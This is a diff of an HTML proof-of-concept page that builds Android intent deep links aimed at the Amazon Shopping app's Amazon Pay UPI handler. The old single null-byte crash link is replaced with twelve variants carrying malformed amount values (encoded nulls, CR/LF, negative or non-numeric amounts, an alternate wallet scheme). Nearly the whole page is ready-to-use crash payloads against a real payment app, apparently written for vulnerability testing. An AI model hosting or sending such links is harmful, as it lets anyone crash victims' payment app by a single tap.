@@ -2,24 +2,98 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Amazon Pay UPI Null Byte Crash PoC</title>
+  <title>Amazon Pay UPI Crash - Multiple Bypass Tests</title>
+  <style>
+    a { display:block; padding:12px; margin:8px; background:#ff9900; color:white; text-decoration:none; border-radius:6px; }
+    .section { margin: 20px 0; padding: 10px; border: 1px solid #ccc; }
+  </style>
 </head>
 <body>
-  <h2>Amazon Pay UPI Remote Crash PoC</h2>
+  <h2>Amazon Pay UPI Remote Crash PoC Tests</h2>
+  
+  <div class="section">
+    <h3>Test 1: Double-encoded null byte (%2500)</h3>
+    <a href="intent://#Intent;scheme=apay_deep_intent;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;S.url=upi%3A%2F%2Fpay%3Fpa%3Dtest%40upi%26pn%3DAmazon%26am%3D1%2500%26cu%3DINR;end">
+      Test 1: %2500 encoding
+    </a>
+  </div>
 
-  <p>
-    Tap the button below on your Android device (with Amazon Shopping installed).
-  </p>
+  <div class="section">
+    <h3>Test 2: Overlong UTF-8 null (%C0%80)</h3>
+    <a href="intent://#Intent;scheme=apay_deep_intent;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;S.url=upi%3A%2F%2Fpay%3Fpa%3Dtest%40upi%26pn%3DAmazon%26am%3D1%25C0%2580%26cu%3DINR;end">
+      Test 2: Overlong UTF-8
+    </a>
+  </div>
 
-  <!-- IMPORTANT: & → &amp; in HTML, %00 stays as-is -->
-  <a href="intent://upi-crash/#Intent;scheme=apay_deep_intent;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;S.url=upi://pay?pa=attacker@upi&amp;pn=Amazon&amp;am=1%00&amp;cu=INR;end"
-     style="display:inline-block;padding:12px 20px;background:#ff9900;color:white;text-decoration:none;border-radius:6px;font-size:18px;">
-    Open Amazon Pay (Trigger Crash)
-  </a>
+  <div class="section">
+    <h3>Test 3: Empty amount parameter</h3>
+    <a href="intent://#Intent;scheme=apay_deep_intent;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;S.url=upi%3A%2F%2Fpay%3Fpa%3Dtest%40upi%26pn%3DAmazon%26am%3D%26cu%3DINR;end">
+      Test 3: Empty am=
+    </a>
+  </div>
 
-  <p>
-    Expected: Amazon app opens → Amazon Pay sheet appears → app crashes with
-    <code>NullPointerException</code> in <code>AP4EAPAndroidClientUtil.getClientContextString</code>.
-  </p>
+  <div class="section">
+    <h3>Test 4: Missing amount parameter entirely</h3>
+    <a href="intent://#Intent;scheme=apay_deep_intent;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;S.url=upi%3A%2F%2Fpay%3Fpa%3Dtest%40upi%26pn%3DAmazon%26cu%3DINR;end">
+      Test 4: No am param
+    </a>
+  </div>
+
+  <div class="section">
+    <h3>Test 5: Newline injection in amount</h3>
+    <a href="intent://#Intent;scheme=apay_deep_intent;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;S.url=upi%3A%2F%2Fpay%3Fpa%3Dtest%40upi%26pn%3DAmazon%26am%3D1%250A%26cu%3DINR;end">
+      Test 5: Newline %0A
+    </a>
+  </div>
+
+  <div class="section">
+    <h3>Test 6: Carriage return in amount</h3>
+    <a href="intent://#Intent;scheme=apay_deep_intent;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;S.url=upi%3A%2F%2Fpay%3Fpa%3Dtest%40upi%26pn%3DAmazon%26am%3D1%250D%26cu%3DINR;end">
+      Test 6: CR %0D
+    </a>
+  </div>
+
+  <div class="section">
+    <h3>Test 7: Very malformed UPI URL</h3>
+    <a href="intent://#Intent;scheme=apay_deep_intent;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;S.url=upi%3A%2F%2Fpay%3F;end">
+      Test 7: Minimal malformed
+    </a>
+  </div>
+
+  <div class="section">
+    <h3>Test 8: Unicode replacement char</h3>
+    <a href="intent://#Intent;scheme=apay_deep_intent;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;S.url=upi%3A%2F%2Fpay%3Fpa%3Dtest%40upi%26pn%3DAmazon%26am%3D1%25EF%25BF%25BD%26cu%3DINR;end">
+      Test 8: Unicode replacement
+    </a>
+  </div>
+
+  <div class="section">
+    <h3>Test 9: Negative amount</h3>
+    <a href="intent://#Intent;scheme=apay_deep_intent;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;S.url=upi%3A%2F%2Fpay%3Fpa%3Dtest%40upi%26pn%3DAmazon%26am%3D-1%26cu%3DINR;end">
+      Test 9: Negative amount
+    </a>
+  </div>
+
+  <div class="section">
+    <h3>Test 10: Non-numeric amount</h3>
+    <a href="intent://#Intent;scheme=apay_deep_intent;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;S.url=upi%3A%2F%2Fpay%3Fpa%3Dtest%40upi%26pn%3DAmazon%26am%3Dabc%26cu%3DINR;end">
+      Test 10: am=abc
+    </a>
+  </div>
+
+  <div class="section">
+    <h3>Test 11: Triple-encoded null</h3>
+    <a href="intent://#Intent;scheme=apay_deep_intent;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;S.url=upi%3A%2F%2Fpay%3Fpa%3Dtest%40upi%26pn%3DAmazon%26am%3D1%25252500%26cu%3DINR;end">
+      Test 11: Triple %252500
+    </a>
+  </div>
+
+  <div class="section">
+    <h3>Test 12: Using apay_wallet_intent scheme</h3>
+    <a href="intent://#Intent;scheme=apay_wallet_intent;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;S.url=upi%3A%2F%2Fpay%3Fpa%3Dtest%40upi%26pn%3DAmazon%26am%3D1%2500%26cu%3DINR;end">
+      Test 12: wallet scheme + %2500
+    </a>
+  </div>
+
 </body>
 </html>
